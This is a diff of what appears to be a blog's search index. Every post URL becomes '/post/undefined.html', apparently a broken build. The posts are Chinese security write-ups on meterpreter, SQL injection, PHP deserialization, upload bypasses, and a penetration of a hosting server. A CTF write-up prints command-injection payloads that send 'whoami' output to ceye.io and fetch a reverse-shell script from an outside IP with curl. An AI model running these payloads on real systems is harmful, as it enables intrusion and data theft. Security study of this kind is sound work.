@@ -4,7 +4,7 @@
     
     <entry>
       <title><![CDATA[metasploit在后渗透中的作用]]></title>
-      <url>/2018/03/19/metasploit%E5%9C%A8%E5%90%8E%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
+      <url>/post/undefined.html</url>
       <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这里简要探究下meterpreter 的使用。meterpreter有个很有效的功能就是，除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。</p>
 <h2 id="0x01-权限提升"><a href="#0x01-权限提升" class="headerlink" title="0x01 权限提升"></a>0x01 权限提升</h2><ol>
 <li><p>getsystem</p>
@@ -57,7 +57,7 @@
     
     <entry>
       <title><![CDATA[Linuxv0.11源码分析之引导启动程序一]]></title>
-      <url>/2018/03/19/Linuxv0.11%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%E5%BC%95%E5%AF%BC%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F%E4%B8%80/</url>
+      <url>/post/undefined.html</url>
       <content type="html"><![CDATA[<h2 id="0x00-大体流程"><a href="#0x00-大体流程" class="headerlink" title="0x00 大体流程"></a>0x00 大体流程</h2><p>这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，<br>最后将程序的控制权交给<code>setup.s</code></p>
 <h2 id="0x01-bios做了什么"><a href="#0x01-bios做了什么" class="headerlink" title="0x01 bios做了什么"></a>0x01 bios做了什么</h2><p>按下电源键的时候，CPU硬件逻辑设计为强行将CS的值置为0F000,IP的值置为0xFFF0,这样CS：IP就指向0xFFFF0这个地址位置。<br>而bios的入口地址就设计在这个位置。这个时候bios开始运行。bios会读取并检测显卡，内存等电脑硬件。<br>接下来bios会在内存中加载向量表和终端服务程序。此时内存的信息如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00000-0x003FF 中断向量表(1kb)</span><br><span class="line">0x00400-0x004FF BIOS数据区(256b)</span><br><span class="line">....</span><br><span class="line">57kb以后-xxxx(8kb)的终端服务程序</span><br></pre></td></tr></table></figure></p>
 <p>接下来bios会触发0x19中断<br>这个中断对应的中断服务程序的功能是将0号磁头对应盘面的0磁道1扇区的内容(共512个字节，就叫做”主引导记录”（Master boot record，缩写为MBR）)复制至内存<code>0x07C00</code>处</p>
@@ -94,7 +94,7 @@
     
     <entry>
       <title><![CDATA[PWN环境搭建]]></title>
-      <url>/2018/03/18/PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
+      <url>/post/undefined.html</url>
       <content type="html"><![CDATA[<h2 id="0x00-关闭安全机制"><a href="#0x00-关闭安全机制" class="headerlink" title="0x00 关闭安全机制"></a>0x00 关闭安全机制</h2><p>1.关掉DEP/NX（堆栈不可执行）<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc  -z execstack -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></p>
 <p>2.关掉Stack Protector/Canary（栈保护）<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></p>
 <p>3.关掉程序ASLR/PIE（程序随机化保护）<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></p>
@@ -126,7 +126,7 @@
     
     <entry>
       <title><![CDATA[解决msf内存不足不能启动的问题]]></title>
-      <url>/2018/03/15/%E8%A7%A3%E5%86%B3msf%E5%86%85%E5%AD%98%E4%B8%8D%E8%B6%B3%E4%B8%8D%E8%83%BD%E5%90%AF%E5%8A%A8%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+      <url>/post/undefined.html</url>
       <content type="html"><![CDATA[<h2 id="0x00-问题"><a href="#0x00-问题" class="headerlink" title="0x00 问题"></a>0x00 问题</h2><p>在vps里面跑msf，经常遇到内存不足，提示如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/activesupport-4.2.10/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``&apos;: Cannot allocate memory - infocmp (Errno::ENOMEM)</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/activesupport-4.2.10/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:1815:in `get_term_capabilities&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2027:in `_rl_init_terminal_io&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2564:in `readline_initialize_everything&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:3849:in `rl_initialize&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4868:in `readline&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:162:in `readline_with_output&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:100:in `pgets&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:375:in `get_input_line&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:191:in `run&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start&apos;</span><br></pre></td></tr></table></figure></p>
 <p>内存不足，一直没有好的解决方案。最近看Linux的时候，看到Swap分区，想到一个解决方案</p>
 <h2 id="0x01-解决方案"><a href="#0x01-解决方案" class="headerlink" title="0x01 解决方案"></a>0x01 解决方案</h2><p>vps默认安装的时候是没有安装swap分区的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@daiker ~]# top</span><br><span class="line">top - 06:35:36 up 14:57,  2 users,  load average: 0.21, 0.09, 0.07</span><br><span class="line">Tasks:  86 total,   1 running,  85 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  0.5 us,  0.0 sy,  0.0 ni, 99.5 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">KiB Mem :  1016108 total,   240924 free,   518952 used,   256232 buff/cache</span><br><span class="line">KiB Swap:        0 total,        0 free,        0 used.   247996 avail Mem</span><br></pre></td></tr></table></figure></p>
@@ -157,7 +157,7 @@
     
     <entry>
       <title><![CDATA[CTF中SQL注入字段名被过滤小技巧]]></title>
-      <url>/2018/03/12/CTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5%E5%AD%97%E6%AE%B5%E5%90%8D%E8%A2%AB%E8%BF%87%E6%BB%A4%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
+      <url>/post/undefined.html</url>
       <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>CTF中SQL注入字段名被过滤小技巧，后续有学习到啥好方法再加进来</p>
 <h1 id="0x01-问题引入"><a href="#0x01-问题引入" class="headerlink" title="0x01 问题引入"></a>0x01 问题引入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+--------+-----------+</span><br><span class="line">| points | flag      |</span><br><span class="line">+--------+-----------+</span><br><span class="line">| 31     | daiker666 |</span><br><span class="line">+--------+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
 <p>然后我们已经知道表名users，要查询flag的值，但是flag被过滤了。</p>
@@ -189,7 +189,7 @@
     
     <entry>
       <title><![CDATA[happyMoctf-ping一下好吗WP]]></title>
-      <url>/2018/02/15/happyMoctf-ping%E4%B8%80%E4%B8%8B%E5%A5%BD%E5%90%97WP/</url>
+      <url>/post/undefined.html</url>
       <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这道题着重点在于没有回显的命令执行，waf也侧重在于防止反弹shell，一般的命令没有过滤。对于没有回显的命令执行一般可以通过<code>DNS通道/HTTP通道</code>和<code>反弹shell</code>。</p>
 <h1 id="0x01-DNS通道-HTTP通道"><a href="#0x01-DNS通道-HTTP通道" class="headerlink" title="0x01 DNS通道/HTTP通道"></a>0x01 DNS通道/HTTP通道</h1><p>post ip=0.0.0.0|curl <em>*</em>.ceye.io/`whoami`，在ceye那个网站可以看到有返回消息(Linux在命令参数执行命令的有`` 和$()两种，这里()被过滤)<br><img src="http://upload-images.jianshu.io/upload_images/5443560-c408e1c41f14c7e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><a id="more"></a><br>执行<code>ls|base64</code>(要经过base64编码是因为有一些不可打印字符和空格)解码后可以看到<br><img src="http://upload-images.jianshu.io/upload_images/5443560-1e0c7759a04a3ad3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png">。<br>然后cat就可以读flag。这里面出了个小差错，<code>&lt;?php</code>后面忘记加空格，导致直接访问查看源码可以直接看到flag。说个好玩的，我13号早上把flag文件名的名字改了，然后晚上查看日志的时候居然发现几个ip在直接访问旧的flag文件名。<br><img src="http://upload-images.jianshu.io/upload_images/5443560-0d402cd5889e2bc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>dns类似，直接post `command`.xx.ceye.io就可以</p>
 <h1 id="0x02-反弹shell"><a href="#0x02-反弹shell" class="headerlink" title="0x02 反弹shell"></a>0x02 反弹shell</h1><p>由于直接反弹shell的命令几乎都会触发waf，所以可以先把执行shell的命令保存到本地，再执行。这里面不存在wget，只能利用curl。<code>-</code>被禁了，不能通过-o来保存到文件，可以通过<code>&gt;</code>。写到/tmp底下执行<br>post ip=0.0.0.0|curl 139.199.2.226:6666/1 &gt;/tmp/1<br><img src="http://upload-images.jianshu.io/upload_images/5443560-c8eecae75ecda861.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>然后本机监听8080端口<br><img src="http://upload-images.jianshu.io/upload_images/5443560-bb7e6e0b6aaebf0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
@@ -217,7 +217,7 @@
     
     <entry>
       <title><![CDATA[php反序列化漏洞]]></title>
-      <url>/2017/12/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+      <url>/post/undefined.html</url>
       <content type="html"><![CDATA[<h2 id="0x00-序列化"><a href="#0x00-序列化" class="headerlink" title="0x00 序列化"></a>0x00 序列化</h2><p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 所有php里面的值都可以使用函数<br><a href="http://php.net/manual/zh/function.serialize.php" target="_blank" rel="noopener">serialize()</a><br>来返回一个包含字节流的字符串来表示。<br><a href="http://php.net/manual/zh/function.unserialize.php" target="_blank" rel="noopener">unserialize()</a><br>函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。<br><a id="more"></a><br>序列化的例子<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@authors</span> daiker (daikersec<span class="doctag">@gmail</span>.com)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>    2017-12-22 15:39:43</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Id$</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$var_int = <span class="number">1</span>;</span><br><span class="line">$var_str = <span class="string">"123"</span>;</span><br><span class="line">$var_float = <span class="number">1.2</span>;</span><br><span class="line">$var_bool =  <span class="keyword">true</span>;</span><br><span class="line">$var_arr = <span class="keyword">array</span>(<span class="string">'1'</span> =&gt; <span class="number">1</span>,<span class="number">1.2</span>,<span class="keyword">false</span> );</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span>   </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $var_name = <span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">myfunction</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   $arrayName = <span class="keyword">array</span>($var_int,$var_str,$var_float,$var_bool,$var_arr,<span class="keyword">new</span> ClassName ());</span><br><span class="line"></span><br><span class="line">   <span class="keyword">foreach</span> ($arrayName <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">echo</span> serialize($value).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
 <p>结果是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">i:<span class="number">1</span>;</span><br><span class="line">s:<span class="number">3</span>:<span class="string">"123"</span>;</span><br><span class="line">d:<span class="number">1.2</span>;</span><br><span class="line">b:<span class="number">1</span>;</span><br><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">1</span>;i:<span class="number">1</span>;i:<span class="number">2</span>;d:<span class="number">1.2</span>;i:<span class="number">3</span>;b:<span class="number">0</span>;&#125;</span><br><span class="line">O:<span class="number">9</span>:<span class="string">"ClassName"</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">"var_name"</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure></p>
 <p>从例子中我们可以看到，变量，数组，对象可以被序列化。变量的值会被保存下来。以<code>:</code>隔开，类名会被保存下来，类变量，类变量名和类变量值会被保存下来，类方法不会被保存起来。</p>
@@ -290,7 +290,7 @@
     
     <entry>
       <title><![CDATA[PHP危险函数总结(随时补充)]]></title>
-      <url>/2017/07/09/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93(%E9%9A%8F%E6%97%B6%E8%A1%A5%E5%85%85)/</url>
+      <url>/post/undefined.html</url>
       <content type="html"><![CDATA[<h3 id="1-获取当前文件路径"><a href="#1-获取当前文件路径" class="headerlink" title="1. 获取当前文件路径"></a>1. 获取当前文件路径</h3><ul>
 <li>echo <code>dirname(__FILE__)</code> ;</li>
 <li>echo<code>getcwd()</code>;</li>
@@ -352,7 +352,7 @@
     
     <entry>
       <title><![CDATA[insert 注入]]></title>
-      <url>/2017/05/09/insert%20%E6%B3%A8%E5%85%A5/</url>
+      <url>/post/undefined.html</url>
       <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>我们最常见的注入就是在查询中注入，那你有没有遇到过插入的时候也能注入。插入中最常见的就是注册用户或者撰写文章。当然，注册用户的时候可能会考虑去数据库查询下有没有这个人，这涉及到查询时候的注入，我们今天忽略这种注入。</p>
 <h2 id="0x01-例子"><a href="#0x01-例子" class="headerlink" title="0x01 例子"></a>0x01 例子</h2><p>下面我给出一个简单的例子，基于php+mysql的。方便实验<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create database sqli;</span><br><span class="line">use sqli;</span><br><span class="line">create table user(</span><br><span class="line">name varchar(40),</span><br><span class="line">email  varchar(20),</span><br><span class="line">qq varchar(20)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
 <a id="more"></a>
@@ -409,7 +409,7 @@
     
     <entry>
       <title><![CDATA[CTF中代码审计小trick(未完)]]></title>
-      <url>/2017/05/04/CTF%E4%B8%AD%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8Ftrick(%E6%9C%AA%E5%AE%8C)/</url>
+      <url>/post/undefined.html</url>
       <content type="html"><![CDATA[<h1 id="0x00-弱类型"><a href="#0x00-弱类型" class="headerlink" title="0x00 弱类型"></a>0x00 弱类型</h1><p>强类的语言遇到函数引数类型和实际调用类型不匹配的情况经常会直接出错或者编译失败；而弱类型的语言常常会实行隐式转换，或者产生难以意料的结果</p>
 <p>也就是说，其实弱类型式其实式语言帮我们做了转换，好处是我们编程的时候可以省很多力，但是方便的同时也带来一些问题。注意的是，<code>python</code>并不是一门弱类型的语言。</p>
 <ol>
@@ -456,7 +456,7 @@ var_dump(2e1==20);</code><br>这些都是正确的，举个例子<figure class="
     
     <entry>
       <title><![CDATA[一次简单渗透]]></title>
-      <url>/2017/04/28/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F/</url>
+      <url>/post/undefined.html</url>
       <content type="html"><![CDATA[<h5 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h5><p>用的手法都是网上有的，大佬勿喷，只是感觉经历坎坷，记录一下</p>
 <h5 id="0x01-初步提权"><a href="#0x01-初步提权" class="headerlink" title="0x01 初步提权"></a>0x01 初步提权</h5><p><img src="http://upload-images.jianshu.io/upload_images/5443560-84aa01fc1f6a28ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><a id="more"></a><br>freehost，免费的?<br>net user一下，</p>
 <p><img src="http://upload-images.jianshu.io/upload_images/5443560-4c4a2d9827a9b31a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png">  </p>
@@ -516,7 +516,7 @@ var_dump(2e1==20);</code><br>这些都是正确的，举个例子<figure class="
     
     <entry>
       <title><![CDATA[hackinglab上传关]]></title>
-      <url>/2017/04/18/hackinglab-3/</url>
+      <url>/post/undefined.html</url>
       <content type="html"><![CDATA[<h2 id="1-请上传一张jpg格式的图片"><a href="#1-请上传一张jpg格式的图片" class="headerlink" title="1. 请上传一张jpg格式的图片"></a>1. 请上传一张jpg格式的图片</h2><blockquote>
 <p>客户端验证。<br>最简单验证，代码都随便我们该。我直接吧检查函数返回true。当然还有很多方法</p>
 </blockquote>
@@ -554,7 +554,7 @@ var_dump(2e1==20);</code><br>这些都是正确的，举个例子<figure class="
     
     <entry>
       <title><![CDATA[hackinglab基础关]]></title>
-      <url>/2017/04/18/hackinglab-1/</url>
+      <url>/post/undefined.html</url>
       <content type="html"><![CDATA[<h2 id="1-key在哪里？"><a href="#1-key在哪里？" class="headerlink" title="1.key在哪里？"></a>1.key在哪里？</h2><blockquote>
 <p>考察最简单的查看源代码的能力<br>右键，查看源代码</p>
 </blockquote>
